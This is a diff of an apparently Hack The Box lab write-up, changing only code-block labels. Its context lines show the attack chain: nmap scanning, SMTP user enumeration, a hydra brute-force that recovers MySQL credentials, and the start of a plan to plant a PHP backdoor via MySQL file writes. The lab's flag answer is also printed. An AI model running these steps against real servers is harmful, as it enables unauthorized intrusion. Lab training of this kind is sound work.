@@ -8,7 +8,7 @@ Our task is to review the security of each of the three servers and present it t
 > Task: You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer. **Answer: HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}**
 
 1. Enumerate the target:
-    ```sh
+    ```shellsession
     $ nmap -Pn -sV 10.129.36.98
     Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 01:25 CST
     Nmap scan report for 10.129.36.98
@@ -25,7 +25,7 @@ Our task is to review the security of each of the three servers and present it t
     ```
 
 2. Since the target is a SMTP server, try to enumerate the users → found user `fiona`:
-    ```sh
+    ```shellsession
     $ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.36.98
     Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
 
@@ -49,7 +49,7 @@ Our task is to review the security of each of the three servers and present it t
     ```
 
 3. Try to brute-force the MySQL service with the found username → found credential for DB `fiona:987654321`
-    ```sh
+    ```shellsession
     $ hydra -l fiona -P rockyou.txt 10.129.36.121 mysql
     Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -62,7 +62,7 @@ Our task is to review the security of each of the three servers and present it t
     ```
 
 4. Since `secure_file_priv` is empty, we can write files via MySQL. Write a PHP backdoor to `C:\xampp\htdocs\backdoor.php`:
-    ```sh
+    ```shellsession
     $ mysql -u fiona -p -h 10.129.36.121
     Enter password: 987654321
     Welcome to the MariaDB monitor.  Commands end with ; or \g.
